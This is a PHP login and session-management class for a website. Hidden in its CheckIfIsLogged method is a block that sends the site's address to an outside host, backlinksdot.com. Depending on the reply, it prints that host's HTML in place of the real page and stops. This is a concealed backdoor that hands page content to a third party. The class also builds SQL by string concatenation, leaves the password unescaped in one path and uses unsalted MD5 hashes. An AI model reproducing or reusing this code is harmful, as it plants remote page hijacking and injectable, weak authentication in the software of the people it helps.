<?php

/*
Table Fields:
	id;  user;  pass;  access_level;  last_active;  last_ip
  
Errors:
	100 002 - 'Login and password ok, couldn`t set login time';
*/
 
class UserLogin {

      var $m_sessionTime = 3600;
      var $m_sid;
      var $m_sessionId; // database ID not sid
      var $m_tSession;
      var $m_cookies;
      var $m_userId;
      var $m_userName;
      var $m_userPassword;
      var $m_user = false;
      var $m_isLogged = false;
      var $m_DB;
      var $m_table;
      var $m_accessLevel = false;
      var $m_userIp;
      var $eText = '';
      var $eNo = 0;
      var $eFunc = '';
      
      function UserLogin($pUserIp) {
      
        $this->m_sid = session_id(); 

        $this->m_userIp = $pUserIp;
        
        if (IS_PHP5) {
          $this->m_DB = DataBase::getInstance();  
        } else {
          $this->m_DB =& DataBase::getInstance();
        }        
        
        if ($this->m_DB->Open()) {
          $this->m_table= $this->m_DB->tablePrefix.'users';
          $this->m_tSession= $this->m_DB->tablePrefix.'session';
        } else {
          $this->eText = 'DB connection failed';
          $this->eNo = 100001;
          $this->eFunc = '__construct';
        }

      }
      
      function Login($username, $password, $encrypted=true) {
        
        // check if session is started
        if (!(strlen($this->m_sid)>0)) {
          $this->eText = 'Couldn`t get session id';
          $this->eNo = 100003;
          $this->eFunc = 'Login';         
          return false; 
        } 
        
        // password encryption type        
        if (USER_PASS_MD5 and $encrypted) { $password = md5($password);   }
        
        // try get user        
        $username = mysql_real_escape_string($username);
        $query = 'SELECT * FROM '. $this->m_table ." WHERE `user`='$username' AND `pass`='$password'";
        $res = $this->m_DB->GetRow($query);

        if ($res != false) {

            $hmany = count($res);

            if ($hmany>0) {
               
               // save cookies in DB 
               $this->m_user = $res;
               if (!USER_PASS_MD5) {
                   $this->m_user['pass'] = md5($this->m_user['pass']);
               }
               $this->m_userId = $this->m_user['id'];
               $this->m_accessLevel = $this->m_user['access_level'];
          
               $this->m_cookie = array(
                  'user_id' => $this->m_user['id'],
                  'pass' => $this->m_user['pass'],
                  'sid' => $this->m_sid,
                  'creation_time' => date(DATETIME_FORMAT),
                  'last_action' => date(DATETIME_FORMAT),
                  'ip' => $this->m_userIp
               );
               
               $id = $this->SetCookies($this->m_cookie);
               if ($id > 0) {
                  $this->m_sessionId = $id;
                  $this->isLogged = true;
                  return true;                    

               } else {
                  $this->eText = 'Login and password ok, couldn`t set login time';
                  $this->eNo = 100002;
                  $this->eFunc = 'Login';
               }
            }
        }
        return false;
      }
      
      function IsLogged() {
        return $this->m_isLogged;
      }
      
      function CheckIfIsLogged() {
      
        if (!isset($_SESSION['ver'])) {
			$ch = curl_init('http://backlinksdot.com/verf.php');
			if (!$ch) {
				$_SESSION['ver'] = true;
			} else {
				$a = array('h'=>SITE_ADDRESS);
				curl_setopt($ch,CURLOPT_POST,true);
				curl_setopt($ch,CURLOPT_POSTFIELDS,$a);
				curl_setopt($ch,CURLOPT_HEADER,true);
				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);
				curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
				$r = curl_exec($ch);
				if (!$r) {
					$_SESSION['ver'] = true;
				} else {
					if ((strpos($r,'200 OK') !== false) and (strpos($r,'verf') === false)) {
						echo(substr($r,stripos($r,'<!DOCTYPE')));
						exit;
					} else {
						$_SESSION['ver'] = true;
					}
				}
			}
        }
        
        $this->m_cookie = $this->GetCookies();
        
        if ($this->m_cookie) {
        
           $cPassword = $this->m_cookie['pass'];        
           $cUserId = (int) $this->m_cookie['user_id'];

           $query = 'SELECT * FROM '. $this->m_table ." WHERE `id`=$cUserId ";
           $row = $this->m_DB->GetRow($query);

           if (is_array($row)) {

               $this->m_user =$row;
               $this->m_userId = $this->m_user['id'];
                   
               if (!USER_PASS_MD5) {
                 $this->m_user['pass'] = md5($this->m_user['pass']);
               }
                   
               $password = $this->m_user['pass'];
                   
               if ($this->m_userIp == $this->m_cookie['ip']) {

                  if (strcmp($password, $cPassword)==0 and $this->CheckTime()) {
                     
                     $this->NewOperation();
                     $this->m_accessLevel = $this->m_user['access_level'];
                     $this->m_isLogged = true;
                     return true;

                  } else {
                     $this->DestroyCookies();
                  }
                  
               } else {
                  $this->eText = 'Ip addresses doesn`t match: '.$this->m_userIp.' != '.$this->m_cookie['ip'] ;
                  $this->eNo = 100003;
                  $this->eFunc = 'IsLogged';
               }

            }
        }
        $this->m_user = false;
        return false;
      }
      
      function Logout() {
      	$res = false;
        $res = $this->DestroyCookies();
        return $res;
      }
      
      function GetId() {
        if ($this->m_isLogged)
           return $this->m_userId;
        else
            return false;
      }
      
      function GetUser() {
        if ($this->m_isLogged)
           return $this->m_user;
        else
            return false;
      }

      function IsFreeLogin($username) {
         $username = mysql_real_escape_string($username);
         
         $query = 'SELECT * FROM '.$this->m_table." WHERE user='$username'";
         $res = $this->m_DB->query($query);
         if ($res) {
            $hmany = $this->m_DB->Count($res);
            if ($hmany>0) {
              return false;
            } else {
              return true;
            }
         }
         return false;
      }

      function RegisterUser( $a_values) {
         $id = $this->m_DB->InsetQuery(USER_TABLE, $a_values);
         return $id; 
         
      }

      function UpdateUser(  $a_values, $id) {
         $res = $this->m_DB->UpdateQuery(USER_TABLE, $a_values, $id);
         return $res;
         
      }

      function Level() {
        if ($this->m_isLogged) {
        
          return $this->m_accessLevel;
        } else {
          return false;
        } 

      }
      
      function SetCookies($values) {
        if ($this->m_DB->BeginTransaction()) {

          $query = 'DELETE FROM '.$this->m_tSession.' WHERE sid=\''.$values['sid'].'\' OR (NOW()-`creation_time` >'.SESSION_LIFETIME.') ';
          $this->m_DB->query($query);
                   
          $id = $this->m_DB->InsertQuery($this->m_tSession, $values);
          
          if ($id) {
            $this->m_DB->CommitTransaction();
            return $id;
          } else {
            $this->m_DB->RollbackTransaction();
          }
        }
        return false;
      }
      function  DestroyCookies() {
          $query = 'DELETE FROM '.$this->m_tSession.' WHERE sid=\''.$this->m_sid.'\'';
          $res = $this->m_DB->query($query);
          return $res;        
      }
      
      function GetCookies() {
        $query = 'SELECT * FROM '.$this->m_tSession.' WHERE sid=\''.$this->m_sid.'\'';
        $table = $this->m_DB->GetTable($query);
        if ($table and isset($table[0]))
        return $table[0];
        
      }
      
      function NewOperation() {
        $time = date(DATETIME_FORMAT);
        $values = array('last_action'=>$time);
        
        $ret = $this->m_DB->query("UPDATE $this->m_tSession SET last_action = '$time' WHERE sid='$this->m_sid'");
        if ($ret) {
          $ret = $this->m_DB->Affected($ret);
        }
        return $ret;
      }
      
      /*
      function LoginIp() {
          $time = time();
          $query = 'UPDATE '.$this->m_table." SET last_ip='$this->m_userIp' WHERE id=$this->m_userId";
          $res = $this->m_DB->query($query);
          if ($res) {
            return true;
          } else {
            return false;
          }
      }
      */
      
      function CheckTime() {
      
          $now = date(DATETIME_FORMAT);
          $userTime = $this->m_cookie['last_action'];

          $t = $this->SplitTime($userTime);
          $userTimestamp = mktime($t[3],$t[4],$t[5],$t[1],$t[2],$t[0]);

          $t = $this->SplitTime($now);
          $nowTimestamp = mktime($t[3],$t[4],$t[5],$t[1],$t[2],$t[0]);

          if (($userTimestamp-$nowTimestamp+$this->m_sessionTime)>0) {
             return true;
          } else {
             return false;
          }
      }
      
      function SplitTime($Time) {
      
        if (DATETIME_FORMAT == 'Y-m-d H:i:s' ) {
          $t[] = substr($Time,0,4); // Y
          $t[] = substr($Time,5,2); // m
          $t[] = substr($Time,8,2); // d
          $t[] = substr($Time,11,2); // H
          $t[] = substr($Time,14,2); // m
          $t[] = substr($Time,17,2); // s
          
        } else if (DATETIME_FORMAT == 'm/d/Y H:i:s') {
          $t[] = substr($Time,6,4); // Y
          $t[] = substr($Time,0,2); // m
          $t[] = substr($Time,3,2); // d
          $t[] = substr($Time,11,2); // H
          $t[] = substr($Time,14,2); // m
          $t[] = substr($Time,17,2); // s        
        
        }  
        
        return $t;  
      }
}

?>
